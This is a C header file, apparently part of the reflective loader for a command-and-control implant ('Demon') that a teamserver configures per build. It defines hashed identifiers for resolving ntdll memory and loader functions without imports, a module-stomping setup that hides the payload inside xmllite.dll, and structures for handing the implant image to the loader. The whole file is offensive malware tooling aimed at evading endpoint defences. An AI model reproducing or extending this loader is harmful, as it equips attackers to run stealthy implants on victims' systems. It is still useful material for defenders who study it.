
#include <windows.h>
#include <Macro.h>

UINT_PTR GetRIP( VOID );
LPVOID   Kcall();
VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize );

#define PAGE_SIZE                       4096
#define MemCopy                         __builtin_memcpy
#define NTDLL_HASH                      0x70e61753

#define SYS_LDRLOADDLL                  0x9e456a43
#define SYS_LDRGETDLLHANDLE             0xb068584f
#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888
#define SYS_NTFREEVIRTUALMEMORY         0x2802c609

#ifndef STOMP_TARGET
#define STOMP_TARGET                    L"xmllite.dll"
#endif
#define STOMP_TARGET_LEN                22
#define STOMP_TARGET_HASH               0x6ddb9555
#define CRYPT_KEY_LEN                   32

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

// module stomping configuration. the target name is patched per-build by the
// teamserver (gStompEnabled is set to 1 to enable, target stays default otherwise)
extern WCHAR gStompTarget[ STOMP_TARGET_LEN ];

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} U_STRING, *PU_STRING;

typedef struct
{
    struct
    {
        UINT_PTR Ntdll;
    } Modules;

    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *LdrGetDllHandle )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );

        NTSTATUS ( NTAPI *NtFreeVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   FreeType
        );
    } Win32;

} INSTANCE, *PINSTANCE;

#pragma pack(1)
typedef struct
{
    PVOID KaynLdr;
    PVOID DllCopy;
    PVOID Demon;
    DWORD DemonSize;
    PVOID TxtBase;
    DWORD TxtSize;
} KAYN_ARGS, *PKAYN_ARGS;
